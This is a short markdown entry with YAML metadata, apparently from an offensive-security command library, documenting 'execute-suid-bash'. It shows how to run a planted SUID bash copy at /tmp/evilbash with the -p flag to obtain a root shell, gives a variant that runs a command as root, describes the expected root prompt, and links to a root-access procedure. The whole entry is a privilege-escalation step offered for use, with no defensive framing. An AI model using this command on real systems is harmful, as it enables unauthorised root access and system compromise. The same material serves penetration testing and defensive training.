---
data: /tmp/evilbash -p
tags:
  - suid
  - execute
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.158Z'
id: 055afa24-5042-4135-b091-d6de56b138cd
verified: false
validated: true
submitted: true
---
# execute-suid-bash

## Command

```bash
/tmp/evilbash -p
```

## Description

Executes the SUID bash binary, using -p to preserve the effective UID, resulting in a root shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p | Preserve effective UID in environment | Yes |
| /tmp/evilbash | Path to SUID binary | Yes |

## Examples

### Basic Usage

```bash
/tmp/evilbash -p
```

### Advanced Usage

```bash
/tmp/evilbash -p -c 'whoami'
```

## Expected Output

Root shell prompt (evilbash-5.0#); commands run as root.

## Related

- [[commands/id-verify-root]]
- [[procedures/Execute-SUID-Bash-for-Root-Access]]
